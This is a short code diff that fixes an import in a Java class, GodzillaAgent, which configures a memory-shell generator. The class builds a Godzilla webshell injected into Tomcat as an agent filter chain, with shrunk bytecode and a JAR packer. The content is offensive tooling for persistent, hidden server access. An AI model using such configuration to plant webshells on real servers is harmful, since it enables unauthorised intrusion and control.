@@ -9,10 +9,11 @@ import com.reajason.javaweb.memshell.config.InjectorConfig;
 import com.reajason.javaweb.memshell.config.ShellConfig;
 import com.reajason.javaweb.packer.Packers;
 import com.reajason.javaweb.packer.jar.JarPacker;
-import com.sun.security.ntlm.Server;
 
 import java.nio.file.Files;
 import java.nio.file.Paths;
+
+import static com.reajason.javaweb.Server.Tomcat;
 
 /**
  * @author ReaJason
@@ -22,7 +23,7 @@ public class GodzillaAgent {
 
     public static void main(String[] args) throws Exception {
         ShellConfig shellConfig = ShellConfig.builder()
-                .server(Server.Tomcat)
+                .server(Tomcat)
                 .shellTool(ShellTool.Godzilla)
                 .shellType(ShellType.AGENT_FILTER_CHAIN)
                 .shrink(true) // 缩小字节码
